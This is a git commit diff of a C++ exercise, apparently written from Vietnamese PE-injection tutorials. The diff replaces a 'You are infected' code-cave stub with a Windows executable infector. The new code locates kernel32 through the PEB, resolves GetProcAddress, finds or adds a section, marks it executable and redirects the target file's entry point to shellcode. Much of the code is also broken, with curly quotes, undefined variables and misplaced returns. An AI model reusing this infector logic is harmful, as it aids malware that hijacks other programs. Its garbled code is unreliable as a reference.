dd8870d5a87d00cd6512e85da57d3071354dcbb6
Hukkenberg <78076365+Hukkenberg@users.noreply.github.com>
2023-07-31 16:40:46 +0700

    Update Task1.2_FIS.cpp
    the solution is under rework.
    in this phase: recreate the logic and the code frame for later upgrades.
    
    credits to vnpt cyber immunity for providing tutorials for this type of task.

--- Task1.2_FIS.cpp
+++ Task1.2_FIS.cpp
@@ -5,111 +5,139 @@
 
 using namespace std;
 
-__declspec(naked) void code_cave(DWORD start_pt, DWORD difference_between_iohs, DWORD message) {
-    //assembly code to build up the cave
-    __asm {
-        pop start_pt
-        MOV message, EDX
-        PUSHAD
-        PUSHFD
-    }
-
-    //plug the message box here
-    cout << message << endl;
-
-    //have the registers restored
-    _asm {
-        POPFD
-        POPAD
-        CMP EDX, 0x00001600
-        push start_pt
-        ret
-    }
-}
-
-int file_open(FILE* target_file) {
-    //initiate flags
-    PIMAGE_DOS_HEADER tmp_dos_header;
-    int is_pe_file = 0;
-
-    //file reading
-    fseek(target_file, 0, SEEK_SET);
-    fread(&tmp_dos_header, sizeof(PIMAGE_DOS_HEADER), 1, target_file);
-
-    //flags check
-    if (tmp_dos_header->e_magic != IMAGE_DOS_SIGNATURE)
-        is_pe_file = -1;
-
-    //return flags
-    return is_pe_file;
-}
-
-PIMAGE_DOS_HEADER retrive_dos_header(FILE* pe_file) {
-    //initiate vars
-    PIMAGE_DOS_HEADER dos_header;
-
-    //file_reading
-    fseek(pe_file, 0, SEEK_SET);
-    fread(&dos_header, sizeof(PIMAGE_DOS_HEADER), 1, pe_file);
-
-    //return the header
-    return dos_header;
-}
-
-PIMAGE_NT_HEADERS retrieve_nt_headers(FILE* pe_file, PIMAGE_DOS_HEADER dos_header) {
-    //initiate vars
-    PIMAGE_NT_HEADERS nt_headers;
-
-    //file reading
-    fseek(pe_file, dos_header->e_lfanew, SEEK_SET);
-    fread(&nt_headers, sizeof(PIMAGE_NT_HEADERS), 1, pe_file);
-
-    //return the header
-    return nt_headers;
-}
-
-DWORD message_box()
-{
-    int msg = MessageBox(NULL, (LPCWSTR)"You are infected", (LPCWSTR)"Warning", MB_OK);
-    return (DWORD)msg;
-}
-
-void shell_creation(PIMAGE_NT_HEADERS nt_headers, DWORD message) {
-    //get the difference between fileAlignment and sectionAlignment
-    DWORD start_pt = (DWORD)(nt_headers->OptionalHeader.FileAlignment);
-    DWORD difference_btw_iohs = ((DWORD)nt_headers->OptionalHeader.SectionAlignment - (DWORD)nt_headers->OptionalHeader.FileAlignment);
-
-    //create and utilise the code cave
-    code_cave(start_pt, difference_btw_iohs, message);
-}
-
 int main(int argc, char* argv[])
 {
-    //file initiating
+    //the target file is initiated here.
     const int MAX_FILEPATH = 255;
-    char file_name[MAX_FILEPATH] = { "C:\benign\benign\1aa177b92c99b9458b270907d65d5687af48385fbbf42c3aef9b69d61d284721.exe" }; //sample no26   
-    FILE* target_file;
-    fopen_s(&target_file, file_name, "rb"); 
-    if (target_file == NULL)
-        return -1;
+    char lpFileName[MAX_FILEPATH] = { "C:\benign\benign\1aa177b92c99b9458b270907d65d5687af48385fbbf42c3aef9b69d61d284721.exe" }; //sample no26   
 
-    //variables initiating
-    DWORD message = NULL;
-    PIMAGE_DOS_HEADER dos_header = {};
-    PIMAGE_NT_HEADERS image_nt_headers = {};
+    //code cave creation - in this step, a codecave is built, and a generalistic address is made for later editing.
+    PEB* peb;
+    __asm {
+        mov eax, fs: [0x30]
+        mov peb, eax
+    }
 
-    //file opening
-    bool flag = file_open(target_file);
+    PEB_LDR_DATA* ldr = *(PEB_LDR_DATA**)((DWORD)peb + 0x0C);
+    LIST_ENTRY* head = *(LIST_ENTRY**)((DWORD)ldr + 0x14);
+    LIST_ENTRY* entry = head->Flink;
 
-    // get the necessary headers
-    dos_header = retrive_dos_header(target_file);
-    image_nt_headers = retrieve_nt_headers(target_file, dos_header);
+    while (entry != head) {
+        LDR_DATA_TABLE_ENTRY* module = *(LDR_DATA_TABLE_ENTRY**)((DWORD)entry + 0x08);
+        USHORT length = *(USHORT*)((DWORD)module + 0x24);
+        WCHAR* buffer = *(WCHAR**)((DWORD)module + 0x28);
+        if (length == 24 && wcsncmp(buffer, L”kernel32.dll”, 12) == 0) {
+            return *(HMODULE*)((DWORD)module + 0x18);
+        }
+        entry = entry->Flink;
+    }
 
-    //implement the shell creator
-    message = message_box();
-    shell_creation(image_nt_headers, message);
+    //the essential header info is gathered here.
+    HMODULE kernel32 = GetKernel32Base();
+    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)kernel32;
+    PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((DWORD)kernel32 + *(DWORD*)(pDosHeader + 0x3c));
+    PIMAGE_EXPORT_DIRECTORY pExpTable = (PIMAGE_EXPORT_DIRECTORY)((DWORD)kernel32 + pNtHeader + 0x78);
+    PDWORD name_table = (PDWORD)((DWORD)kernel32 + pExpTable + 0x20);
+    PWORD ordinal_table = (PWORD)((DWORD)kernel32 + pExpTable + 0x24);
+    PDWORD address_table = (PDWORD)((DWORD)kernel32 + pExpTable + 0x1c);
 
+    for (int i = 0; i < exp->NumberOfNames; i++) {
+        char* name = (char*)((DWORD)kernel32 + name_table[i]);
+        if (strcmp(name, “GetProcAddress”) == 0) {
+            WORD ordinal = ordinal_table[i];
+            DWORD address = address_table[ordinal];
+            return (FARPROC)((DWORD)kernel32 + address);
+        }
+    }
+    
+    //the shellcode is then edited, primarily for replacing the generalistic address.
+    PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER)lpFileAddr;
+    PIMAGE_NT_HEADERS pNtHdrs = (PIMAGE_NT_HEADERS)(lpFileAddr + pDosHdr->e_lfanew);
+    PIMAGE_SECTION_HEADER pSecHdr = (PIMAGE_SECTION_HEADER)IMAGE_FIRST_SECTION(pNtHdrs);
+    DWORD dwOEP = pNtHdrs->OptionalHeader.AddressOfEntryPoint;
+
+    for (DWORD i = 0; i < dwShellSize; i++) {
+        if (*((LPDWORD)(shellcode + i)) == 0xaaaaaaaa) {
+            *((LPDWORD)(shellcode + i)) = dwOEP;
+            break;
+        }
+    }
+
+    //the file is opened here.
+    HANDLE hFile = CreateFileA(
+        lpFileName,
+        FILE_READ_ACCESS | FILE_WRITE_ACCESS,
+        0,
+        NULL,
+        OPEN_ALWAYS,
+        FILE_ATTRIBUTE_NORMAL,
+        NULL
+    );
+    DWORD dwFileSize = GetFileSize(hFile, NULL);
+    HANDLE hFileMapping = CreateFileMapping(
+        hFile,
+        NULL,
+        PAGE_READWRITE,
+        0,
+        dwFileSize,
+        NULL
+    );
+    LPBYTE lpFileAddr = (LPBYTE)MapViewOfFile(
+        hFileMapping,
+        FILE_MAP_READ | FILE_MAP_WRITE,
+        0,
+        0,
+        dwFileSize
+    );
+    
+    //the code cave spot is being serached, and the first found is set to be the plugging pt.
+    DWORD dwCount = 0;
+    DWORD dwPos;
+    LPVOID lpShellAddr = 0;
+    for (dwPos = pNtHdrs->OptionalHeader.SizeOfHeaders; dwPos < dwFileSize; dwPos++)
+    {
+        if (*(lpFileAddr + dwPos) == 0x00) {
+            if (dwCount++ == dwShellSize)
+            {
+                lpShellAddr = (LPVOID)(lpFileAddr + dwPos – dwShellSize);
+                break;
+            }
+        }
+        else {
+            dwCount = 0;
+        }
+    }
+
+    //if there are no favourable spot, another section for that is created.
+    DWORD dwNewSecRVA = 0, dwNewSecRaw = 0;
+    if (!lpShellAddr) {
+        while (pSecHdr->SizeOfRawData != 0) {
+            pSecHdr++;
+        }
+        dwNewSecRVA = pSecHdr->VirtualAddress + pSecHdr->Misc.VirtualSize;
+        dwNewSecRaw = pSecHdr->PointerToRawData + pSecHdr->SizeOfRawData;
+        pNtHdrs->FileHeader.NumberOfSections++;
+        strncpy((char*)pSecHdr->Name, “. / 001”, IMAGE_SIZEOF_SHORT_NAME);
+        pNtHdrs->OptionalHeader.SizeOfImage += pNtHdrs->OptionalHeader.SectionAlignment;
+        pSecHdr->SizeOfRawData = pNtHdrs->OptionalHeader.FileAlignment;
+        pSecHdr->Misc.VirtualSize = pNtHdrs->OptionalHeader.SectionAlignment;
+        pSecHdr->PointerToRawData = dwNewSecRaw;
+        pSecHdr->VirtualAddress = dwNewSecRVA;
+        ZeroMemory((LPVOID)(
+            (DWORD)lpFileAddr + dwNewSecRaw),
+            pNtHdrs->OptionalHeader.FileAlignment
+        );
+        lpShellAddr = (LPVOID)(lpFileAddr + dwNewSecRaw);
+        printf(“[+] Added section % s”, pSecHdr->Name);
+    }
+
+    //the pe file info in the targeted section is altered for its sake...
+    pSecHdr[i].Misc.VirtualSize += dwShellSize;
+    pSecHdr[i].Characteristics |= IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE;
+    pNtHdrs->OptionalHeader.AddressOfEntryPoint = shellOffset – pSecHdr[i].PointerToRawData + pSecHdr[i].VirtualAddress;
+
+    //exiting
     return 0;
 }
 
-  
+//credentials: https://sec.vnpt.vn/2023/05/pe-injection/, https://sec.vnpt.vn/2023/07/tim-dia-chi-kernel32-dll-va-cac-ham-api/ 
